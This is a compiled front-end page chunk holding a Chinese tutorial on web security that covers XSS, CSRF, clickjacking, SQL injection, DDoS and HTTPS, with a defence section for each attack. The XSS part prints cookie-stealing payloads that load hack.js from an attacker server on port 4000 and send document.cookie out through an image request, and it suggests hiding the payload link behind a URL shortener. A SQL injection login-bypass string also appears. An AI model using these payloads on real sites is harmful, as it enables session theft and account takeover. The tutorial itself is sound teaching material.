(window.webpackJsonp=window.webpackJsonp||[]).push([[24],{503:function(t,s,a){"use strict";a.r(s);var r=a(59),e=Object(r.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"网络安全"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络安全"}},[t._v("#")]),t._v(" 网络安全")]),t._v(" "),a("h2",{attrs:{id:"_1-xss-攻击（直接盗取用户登录状态）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-xss-攻击（直接盗取用户登录状态）"}},[t._v("#")]),t._v(" 1.XSS 攻击（直接盗取用户登录状态）")]),t._v(" "),a("p",[t._v("Cross Site Scripting")]),t._v(" "),a("p",[t._v("通过在有安全漏洞的 web 网站上的 url 后输入非法的非本站点的 HTML 标签或是 JavaScript 进行的一种攻击")]),t._v(" "),a("h3",{attrs:{id:"xss-攻击分类"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-攻击分类"}},[t._v("#")]),t._v(" XSS 攻击分类")]),t._v(" "),a("p",[t._v("1.反射型-url 参数直接注入")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("普通，网页会渲染"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v("后的内容\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("china\n\n黑客先尝试是否能alert尝试\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n如果成功了，则开始输入非法脚本\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//获取Cookie")]),t._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("scriptsrc"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://localhost:4000/hack.js"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n\n其中在"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4000")]),t._v("端口的hack"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("js内容为：用img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src获取异步请求\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" img "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Image")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nimg"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://localhost:4000/img?c='")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie\n\n然后在"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4000")]),t._v("端口后台操作获取"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),t._v("端口的cookie值，此后，在登录"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),t._v("端口网站时，我们直接可以通过获取到的cookie模仿此人登录来进行操作了\n直接在后台输入cookie来伪造cookie入侵chrome\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="')]),t._v("\n登陆成功\n")])])]),a("p",[a("strong",[t._v("如何触发")])]),t._v(" "),a("p",[t._v("比如通过百度短网址的缩短网址功能https://dwz.cn/")]),t._v(" "),a("p",[t._v("将")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('http://localhost:3000/?from=<scriptsrc="http://localhost:4000/hack.js"><\/script>\n')])])]),a("p",[a("strong",[t._v("缩短成一个看似正常的网址，如果用户点击进去了，又登录了，则会被黑客窃取登录信息")])]),t._v(" "),a("p",[t._v("2.存储型-存储到数据库中")]),t._v(" "),a("p",[t._v("比如在某个评论区先实验是否可以输出 script 脚本：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("//评论<script>alert(1)<\/script>\n")])])]),a("p",[t._v("发现成功弹框了，则开始评论带有非法非本站点的脚本")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//跨站脚本注入")]),t._v("\n我来了"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://localhost:4000/hack.js"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),a("p",[t._v("此时评论区显示我来了三个字样，并加载了这个脚本，并且已经存入数据库，"),a("strong",[t._v("这会导致所有登陆后访问这个评论页面的用户信息都会被 4000 端口窃取")])]),t._v(" "),a("h3",{attrs:{id:"xss-防止攻击方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-防止攻击方法"}},[t._v("#")]),t._v(" XSS 防止攻击方法")]),t._v(" "),a("p",[t._v("1.ejs 转义")]),t._v(" "),a("p",[t._v("ejs 是一套简单的模板语言，利用普通的 js 代码生成 html 页面")]),t._v(" "),a("p",[t._v("使用见https://www.jianshu.com/p/6ed2f9fb6197")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("<%code%>用于执行其中javascript代码；\n<%=code%>会对code进行html转义；用这条来防止XSS攻击，会把script标签直接显示出来\n<%-code%>将不会进行转义\n")])])]),a("p",[t._v("2.HEAD 设置 X-XSS-Protextion:1 启用 XSS 过滤")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ctx.set('X-XSS-Protection',1)\n")])])]),a("p",[t._v("3.CSP（也是 ctx.set)")]),t._v(" "),a("p",[t._v("CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("//只允许加载本站资源\nContent-Security-Policy:default-src'self'\n//只允许加载HTTPS协议图片\nContent-Security-Policy:img-srchttps://*\n//不允许加载任何来源框架\nContent-Security-Policy:child-src'none'\n")])])]),a("p",[t._v("4.转义字符")]),t._v(" "),a("p",[t._v("原理是将引号、尖括号、斜杠进行转义，使 script 标签无法生效")]),t._v(" "),a("ul",[a("li",[t._v("黑名单：")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('function escape(str) {\n\tstr = str.replace(/&/g, "&amp;");\n\tstr = str.replace(/</g, "&lt;");\n\tstr = str.replace(/>/g, "&gt;");\n\tstr = str.replace(/"/g, "&quto;");\n\tstr = str.replace(/\'/g, "&##39;");\n\tstr = str.replace(/`/g, "&##96;");\n    str = str.replace(/\\//g, "&##x2F;");\n    return str\n}\n')])])]),a("ul",[a("li",[t._v("白名单")])]),t._v(" "),a("p",[t._v("对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法。引入 xss 白名单库")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('var xss = require("xss");\nvar html = xss(\'<h1 id="title">XSS Demo</h1><script>alert("xss");<\/script>\');\n// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;\nconsole.log(html);\n')])])]),a("p",[t._v("5.设置 HttpOnly Cookie")]),t._v(" "),a("p",[t._v("这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。")]),t._v(" "),a("h2",{attrs:{id:"_2-csrf（cross-site-request-forgery）（只是利用用户登录状态）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-csrf（cross-site-request-forgery）（只是利用用户登录状态）"}},[t._v("#")]),t._v(" 2.CSRF（Cross-site Request forgery）（只是利用用户登录状态）")]),t._v(" "),a("p",[t._v("是一种挟制用户在当前已登录的"),a("code",[t._v("Web")]),t._v("应用程序上执行非本意的操作的攻击方法，"),a("code",[t._v("CSRF")]),t._v(" 就是利用用户的登录态发起恶意请求")]),t._v(" "),a("p",[a("strong",[t._v("如何触发：")])]),t._v(" "),a("p",[t._v("用户已经登录了 A 网站，并在本地记录了 cookie，"),a("strong",[t._v("那么在用户没有退出销毁 cookie 的情况下")]),t._v("，意外访问了恶意网站 B，B 网站会有一个要求访问站点 A 的操作，这个时候 A 站点如果没有做任何的 CSRF 防御，则会被恶意攻击")]),t._v(" "),a("p",[t._v("比如假设网站中有一个通过 Get 请求提交用户评论的接口，那么攻击者就可以在钓鱼网站中加入一个图片，图片的地址就是评论接口")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("<img src=\"http://www.domain.com/xxx?comment='attack'\"/>\n")])])]),a("h3",{attrs:{id:"防御手段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防御手段"}},[t._v("#")]),t._v(" 防御手段")]),t._v(" "),a("p",[t._v("1.阻止第三方网站访问到用户 cookie")]),t._v(" "),a("p",[t._v("2.阻止第三方网站请求接口")]),t._v(" "),a("p",[a("strong",[t._v("3.请求时附带验证信息 TOKEN、手机验证码、图片验证码（这些验证码设置一定是在后端的，否则不安全）等")])]),t._v(" "),a("p",[t._v("TOKEN 防止 SCRF 攻击：")]),t._v(" "),a("p",[t._v("https://blog.csdn.net/weixin_30677617/article/details/101518465")]),t._v(" "),a("p",[t._v("4.cookie 值进行 hash：攻击者在访问信任网站 A 时，虽然浏览器可以在请求中带上 cookie，但是网站 A 却不仅仅通过 cookie 来判断用户身份，还要通过发来的伪随机数来判断请求是否真的是用户发送的")]),t._v(" "),a("h2",{attrs:{id:"_3-点击劫持-clickjacking"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-点击劫持-clickjacking"}},[t._v("#")]),t._v(" 3.点击劫持-clickjacking")]),t._v(" "),a("p",[a("strong",[t._v("点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。")])]),t._v(" "),a("p",[t._v("比如我们登陆了 3000 端口的 A 网站后，意外的登陆了 4000 端口的恶意网站http://localhost:4000/clickjacking.html，在4000端口设置了一个iframe，其中嵌套着3000端口的内容，比如是一个评论区，并将这个iframe透明度设置为0，在4000端口设置的网页中有一个按钮和3000端口的评论按钮实际上重合，点击这个恶意网站的按钮，实际上进行了在3000端口评论的恶意操作。")]),t._v(" "),a("h3",{attrs:{id:"防御手段-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防御手段-2"}},[t._v("#")]),t._v(" 防御手段")]),t._v(" "),a("p",[t._v("1.后端设置 X-FRAME-OPTIONS 报头")]),t._v(" "),a("p",[t._v("该响应头有三个值可选，分别是\n"),a("strong",[t._v("DENY，表示页面不允许通过 iframe 的方式展示")])]),t._v(" "),a("p",[t._v("SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示")]),t._v(" "),a("p",[t._v("ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ctx.set('X-FRAME-OPTIONS','DENY')\n")])])]),a("p",[t._v("2.JS 方式")]),t._v(" "),a("h2",{attrs:{id:"_4-sql-注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-sql-注入"}},[t._v("#")]),t._v(" 4.SQL 注入")]),t._v(" "),a("p",[a("strong",[t._v("针对的是数据库")])]),t._v(" "),a("p",[t._v("比如在需要填入用户名和密码的表单中，黑客不知道密码，在填入用户名后，密码写成：1'or'1'='1 的形式，那么在后端拼接后的 SQL 将会是：")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//拼接后的SQL")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SELECT")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nFROMtest"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("user\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("WHERE")]),t._v(" username"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'laowang'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("AND")]),t._v(" password"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'1'")]),t._v("or"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'1'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'1'")]),t._v("\n\n使password后的"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("变成一个永真，这样永远都可以登录成功\n")])])]),a("h3",{attrs:{id:"防御方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防御方式"}},[t._v("#")]),t._v(" 防御方式")]),t._v(" "),a("p",[t._v("所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的?占位参数。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//错误写法")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" sql"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token template-string"}},[a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("\nSELECT*\nFROMtest.user\nWHERE username='")]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\nAND password='")]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("password"),a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\n")]),a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")])]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'sql'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("sql"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nres"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("awaitquery")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sql"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//正确的写法")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" sql"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("`"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SELECT")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("FROM")]),t._v(" test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("user\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("WHERE")]),t._v(" username"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("AND")]),t._v(" password"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'sql'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("sql"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nres"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("awaitquery")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sql"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("h2",{attrs:{id:"其他攻击手段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#其他攻击手段"}},[t._v("#")]),t._v(" 其他攻击手段")]),t._v(" "),a("p",[t._v("OS 注入：针对的是操作系统")]),t._v(" "),a("p",[t._v("请求劫持：")]),t._v(" "),a("ul",[a("li",[t._v("DNS 劫持，即修改了域名解析的结果，使得访问到的不是预期的 ip")]),t._v(" "),a("li",[t._v("HTTP 劫持，此时只能升级 https")])]),t._v(" "),a("p",[t._v("DDOS：")]),t._v(" "),a("p",[t._v("是一大类攻击的总称，对网站的任何环节都可以进行攻击，只要其中一个环节攻破，整个流程就会瘫痪")]),t._v(" "),a("ul",[a("li",[t._v("SYN Flood")])]),t._v(" "),a("p",[t._v("此攻击通过向目标发送具有欺骗性源 IP 地址的大量 TCP“初始连接请求”SYN 数据包来利用 TCP 握手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。")]),t._v(" "),a("ul",[a("li",[t._v("HTTP Flood")])]),t._v(" "),a("p",[t._v("此攻击类似于同时在多个不同计算机上反复按 Web 浏览器中的刷新-大量 HTTP 请求泛滥服务器，导致拒绝服务。")]),t._v(" "),a("p",[t._v("防御：备份网站，用靠谱的运营商，带宽扩容")]),t._v(" "),a("h2",{attrs:{id:"_5-http-危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-http-危害"}},[t._v("#")]),t._v(" 5.HTTP 危害")]),t._v(" "),a("p",[t._v("HTTP 是明文传输的，且要经历许多服务器，可能会在传输过程中遭到窃取（密码、敏感信息）篡改（重定向到别的网站）")]),t._v(" "),a("p",[t._v("趋势：转向 HTTPS 加密")]),t._v(" "),a("h4",{attrs:{id:"https"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#https"}},[t._v("#")]),t._v(" HTTPS")]),t._v(" "),a("p",[a("strong",[t._v("=HTTP+SSL 证书")])]),t._v(" "),a("p",[t._v("SSL 证书由浏览器中“受信任的根证书颁发机构”在验证服务器身份后颁发,具有网站身份验证和加密传输双重功能，"),a("strong",[t._v("使用的是非对称加密技术。")])]),t._v(" "),a("p",[a("strong",[t._v("什么是对称加密（应用场景如银行的 DES)：")])]),t._v(" "),a("p",[t._v("所谓对称加密是指双方传递信息时，A 传递的信息通过秘钥进行加密，B 通过相同的秘钥来进行解密，缺点是：如果秘钥泄露，则信息就会被泄露。所以通常的做法是"),a("strong",[t._v("使用非对称加密")])]),t._v(" "),a("p",[a("strong",[t._v("什么是非对称加密：")])]),t._v(" "),a("p",[t._v("产生一对秘钥，其中"),a("strong",[t._v("公钥负责加密，私钥负责解密")]),t._v("，如果私钥无法解开说明公钥无效（抗抵赖），上述过程是通过复杂算法实现的")]),t._v(" "),a("h4",{attrs:{id:"git-中的两种传输方式（重要）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#git-中的两种传输方式（重要）"}},[t._v("#")]),t._v(" git 中的两种传输方式（重要）")]),t._v(" "),a("p",[t._v("clone 中的两个选项：SSH 和 HTTPS 方式，其中 SSH 需要用到公钥和私钥")]),t._v(" "),a("h5",{attrs:{id:"ssh-公钥登录原理：（使用非对称秘钥）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-公钥登录原理：（使用非对称秘钥）"}},[t._v("#")]),t._v(" "),a("strong",[t._v("SSH 公钥登录原理：（使用非对称秘钥）")])]),t._v(" "),a("p",[t._v("主要是为了解决每次登录服务器都要输入密码的问题，主要流程为")]),t._v(" "),a("p",[t._v("客户端生成公钥和秘钥，将公钥存放在服务端，客户端请求连接服务端时，服务端将一个由公钥加密的随机字符串发送给客户端，客户端通过私钥解密后，将结果发送给服务端，服务端进行比对，如果成功，则同意登录")]),t._v(" "),a("h5",{attrs:{id:"https-验证过程：（最后客户端和服务端的通讯是对称秘钥）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#https-验证过程：（最后客户端和服务端的通讯是对称秘钥）"}},[t._v("#")]),t._v(" "),a("strong",[t._v("HTTPS 验证过程：（最后客户端和服务端的通讯是对称秘钥）")])]),t._v(" "),a("ul",[a("li",[t._v("首先"),a("strong",[t._v("服务端")]),t._v("生成公钥和私钥，"),a("strong",[t._v("将公钥发送给 CA 证书中心")]),t._v("，"),a("strong",[t._v("申请数字证书")])]),t._v(" "),a("li",[t._v("CA 审核成功，给服务端下发数字证书")]),t._v(" "),a("li",[t._v("TCP 三次握手，客户端发送 HTTPS 证书请求，"),a("strong",[t._v("服务端发送公钥和证书")])]),t._v(" "),a("li",[t._v("客户端"),a("strong",[t._v("向 CA 证书中心询问")]),t._v("该证书是否有效（"),a("strong",[t._v("即验证服务端的身份")]),t._v("）")]),t._v(" "),a("li",[t._v("CA 中心返回客户端验证结果")]),t._v(" "),a("li",[t._v("客户端自动生成一组"),a("strong",[t._v("对称秘钥（用该秘钥加密要发送的 URL 链接申请）")]),t._v("，"),a("strong",[t._v("并用得到的公钥加密这组对称秘钥，发送加密的秘钥和加密的 URL 链接")])]),t._v(" "),a("li",[t._v("服务端"),a("strong",[t._v("用私钥解密，得到对称秘钥")]),t._v("，再用该对称秘钥解密 URL 链接")]),t._v(" "),a("li",[t._v("服务端通过 URL 取得网页，并用客户端发送来的对称秘钥把该网页加密后发给客户端")]),t._v(" "),a("li",[t._v("客户端用自身的对称秘钥解密，获得网页内容")]),t._v(" "),a("li",[t._v("TCP 四次挥手")])]),t._v(" "),a("h2",{attrs:{id:"防御手段-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防御手段-3"}},[t._v("#")]),t._v(" 防御手段")]),t._v(" "),a("h3",{attrs:{id:"_1-密码安全"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-密码安全"}},[t._v("#")]),t._v(" 1.密码安全")]),t._v(" "),a("p",[t._v("泄露渠道：")]),t._v(" "),a("ul",[a("li",[t._v("数据库被偷、")]),t._v(" "),a("li",[t._v("服务器被监听、")]),t._v(" "),a("li",[t._v("即使用了 md5 或是 sha1 加密，但是由于密码过于简单，结果可预制的"),a("strong",[t._v("彩虹表")]),t._v("（明文和密文对应的表，比如 cmd5.com）攻击来反推出来")])]),t._v(" "),a("p",[a("strong",[t._v("解决代码见 pdf")])]),t._v(" "),a("p",[t._v("思考：")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("两次 md5 是否可取：不可取，对于简单密码，两次 md5 